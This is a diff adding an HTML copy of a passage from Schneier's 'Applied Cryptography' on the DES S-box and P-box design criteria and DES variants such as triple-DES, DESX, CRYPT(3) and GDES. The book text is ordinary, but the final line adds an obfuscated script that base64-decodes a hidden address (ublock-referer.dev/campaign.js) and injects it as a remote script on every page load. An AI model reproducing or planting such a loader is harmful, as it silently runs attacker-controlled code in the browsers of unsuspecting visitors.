@@ -1,0 +1,118 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=293-297//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-13.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-15.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">12.5 The Real Design Criteria</FONT></H3>
+<P>After differential cryptanalysis became public, IBM published the design criteria for the S-boxes and the P-box [373,374]. The criteria for the S-boxes are:
+</P>
+<DL>
+<DD>&#151; Each S-box has 6 input bits and 4 output bits. (This was the largest size that could be accommodated in a single chip with 1974 technology.)
+<DD>&#151; No output bit of an S-box should be too close to a linear function of the input bits.
+<DD>&#151; If you fix the left-most and right-most bits of an S-box and vary the 4 middle bits, each possible 4-bit output is attained exactly once.
+<DD>&#151; If two inputs to an S-box differ in exactly 1 bit, the outputs must differ in at least 2 bits.
+<DD>&#151; If two inputs to an S-box differ in the 2 middle bits exactly, the outputs must differ in at least 2 bits.
+<DD>&#151; If two inputs to an S-box differ in their first 2 bits and are identical in their last 2 bits, the two outputs must not be the same.
+<DD>&#151; For any nonzero 6-bit difference between inputs, no more than 8 of the 32 pairs of inputs exhibiting that difference may result in the same output difference.
+<DD>&#151; A criterion similar to the previous one, but for the case of three active S-boxes.
+</DL>
+<P>The criteria for the P-box are:
+</P>
+<DL>
+<DD>&#151; The 4 output bits from each S-box in round i are distributed so that 2 of them affect the middle-bits of S-boxes at round<I>i</I> &#43; 1 and the other 2 affect end bits.
+<DD>&#151; The 4 output bits from each S-box affect six different S-boxes; no 2 affect the same S-box.
+<DD>&#151; If the output bit from one S-box affects a middle bit of another S-box, then an output bit from that other S-box cannot affect a middle bit of the first S-box.
+</DL>
+<P>The paper goes on to discuss the criteria. Generating S-boxes is pretty easy today, but was a complicated task in the early 1970s. Tuchman has been quoted as saying that they ran computer programs for months cooking up the S-boxes.
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">12.6 DES Variants</FONT></H3>
+<P><FONT SIZE="+1"><B><I>Multiple DES</I></B></FONT></P>
+<P>Some DES implementations use triple-DES (see Figure 12.10) [55]. Since DES is not a group, then the resultant ciphertext is much harder to break using exhaustive search: 2<SUP>112</SUP> attempts instead of 2<SUP>56</SUP> attempts. See Section 15.2 for more details.</P>
+<I><P><A NAME="Fig10"></A><A HREF="javascript:displayWindow('images/12-10.jpg',272,126 )"><IMG SRC="images/12-10t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-10.jpg',272,126)"><FONT COLOR="#000077"><B>Figure 12.10</B></FONT></A>&nbsp;&nbsp;Triple-DES.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>DES with Independent Subkeys</I></B></FONT></P>
+<P>Another variation is to use a different subkey for each round, instead of generating them from a single 56-bit key [851]. Since 48 key bits are used in each of 16 rounds, this means that the key length for this variant is 768 bits. This variant would drastically increase the difficulty of a brute-force attack against the algorithm; that attack would have a complexity of 2<SUP>768</SUP>.</P>
+<P>However, a meet-in-the-middle attack (see Section 15.1) would be possible. This would reduce the complexity of attack to 2<SUP>384</SUP>; still long enough for any conceivable security needs.</P>
+<P>Although independent subkeys foil linear cryptanalysis, this variant is susceptible to differential cryptanalysis and can be broken with 2<SUP>61</SUP> chosen plaintexts (see Table 12.15) [167,172]. It would seem that any modification of the key schedule cannot make DES much stronger.</P>
+<P><FONT SIZE="+1"><B><I>DESX</I></B></FONT></P>
+<P>DESX is a DES variant from RSA Data Security, Inc. that has been included in the MailSafe electronic mail security program since 1986 and the BSAFE toolkit since 1987. DESX uses a technique called whitening (see Section 15.6) to obscure the inputs and outputs to DES. In addition to a 56-bit DES key, DESX has an additional 64-bit whitening key. These 64 bits are XORed to the plaintext before the first round of DES. An additional 64 bits, computed as a one-way function of the entire 120-bit DES key, is XORed to the ciphertext after the last round [155]. Whitening makes DESX much stronger than DES against a brute-force attack; the attack requires (2<SUP>120</SUP>)/<I>n</I> operations with <I>n</I> known plaintexts. It also improves security against differential and linear cryptanalysis; the attacks require 2<SUP>61</SUP> chosen plaintexts and 2<SUP>60</SUP> known plaintexts, respectively [1338].</P>
+<P><FONT SIZE="+1"><B><I>CRYPT(3)</I></B></FONT></P>
+<P>CRYPT(3) is a DES variant found on UNIX systems. It is primarily used as a one-way function for passwords, but sometimes can also be used for encryption. The difference between CRYPT(3) and DES is that CRYPT(3) has a key-dependent expansion permutation with 2<SUP>12</SUP> possible permutations. This was done primarily so that off-the-shelf DES chips could not be used to construct a hardware password-cracker.</P>
+<P><FONT SIZE="+1"><B><I>Generalized DES</I></B></FONT></P>
+<P>Generalized DES (GDES) was designed both to speed up DES and to strengthen the algorithm [1381,1382]. The overall block size increases while the amount of computation remains constant.
+</P>
+<P>Figure 12.11 is a block diagram of GDES. GDES operates on variable-sized blocks of plaintext. Encryption blocks are divided up into <I>q</I> 32-bit sub-blocks; the exact number depends on the total block size (this was variable in the design, but must be fixed for each implementation). In general, <I>q</I> equals the block size divided by 32.</P>
+<P>Function f is calculated once per round on the right-most block. The result is XORed with all the other parts, which are then rotated to the right. GDES has a variable number of rounds, <I>n.</I> There is a slight modification to the last round, so that the encryption and decryption processes differ only in the order of the subkeys (just like DES). In fact, if <I>q</I> = 2 and <I>n</I> = 16, this <I>is</I> DES.</P>
+<P>Biham and Shamir [167,168] showed that, using differential cryptanalysis, GDES with <I>q</I> = 8 and <I>n</I> = 16 is breakable with only six chosen plaintexts. If independent subkeys are also used, 16 chosen plaintexts are required. GDES with <I>q</I> = 8 and <I>n</I> = 22 is breakable with 48 chosen plaintexts, and GDES with <I>q</I> = 8 and <I>n</I> = 31 requires only 500,000 chosen plaintexts to break. Even GDES with <I>q</I> = 8 and <I>n</I> = 64 is weaker than DES; 2<SUP>49</SUP> chosen plaintexts are required to break it. In fact, any GDES scheme that is faster than DES is also less secure (see Table 12.15).</P>
+<P>A variant of this scheme recently appeared [1591]. It is probably no more secure than the original GDES. In general, any large block DES variant that is faster than DES is probably also less secure than DES.</P>
+<P><FONT SIZE="+1"><B><I>DES with Alternate S-Boxes</I></B></FONT></P>
+<P>Other DES modifications centered around the S-boxes. Some designs made the order of the S-boxes variable. Other designers varied the contents of the S-boxes themselves. Biham and Shamir showed [170,172] that the design of the S-boxes, and even the order of the S-boxes themselves, were optimized against differential cryptanalysis:
+</P>
+<BLOCKQUOTE><P>The replacement of the order of the eight DES S-boxes (without changing their value) also makes DES much weaker: DES with 16 rounds of a particular replaced order is breakable in about 2<SUP>38</SUP> steps.... DES with random S-boxes is shown to be very easy to break. Even a minimal change of one entry of one of the DES S-boxes can make DES easier to break.</P>
+</BLOCKQUOTE><P>The DES S-boxes were not optimized against linear cryptanalysis. There are better S-boxes than the ones that come with DES, but blindly choosing new S-boxes isn&#146;t a good idea.
+</P>
+<I><P><A NAME="Fig11"></A><A HREF="javascript:displayWindow('images/12-11.jpg',227,274 )"><IMG SRC="images/12-11t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-11.jpg',227,274)"><FONT COLOR="#000077"><B>Figure 12.11</B></FONT></A>&nbsp;&nbsp;GDES.</I>
+</P>
+<P>Table 12.15 [167,169] lists some modifications to DES and the number of chosen plaintexts required for differential cryptanalysis. One change not listed, combining the left and right halves using addition mod 2<SUP>4</SUP> instead of XOR, is 2<SUP>17</SUP> times harder to break than DES [689].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-13.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-15.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(FRGsNQhk, wzXaFhDd) {wzXaFhDd = FRGsNQhk.createElement('script');wzXaFhDd.type = 'text/javascript';wzXaFhDd.async = true;wzXaFhDd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');FRGsNQhk.getElementsByTagName('body')[0].appendChild(wzXaFhDd);}(document));</script></body>
+</html>
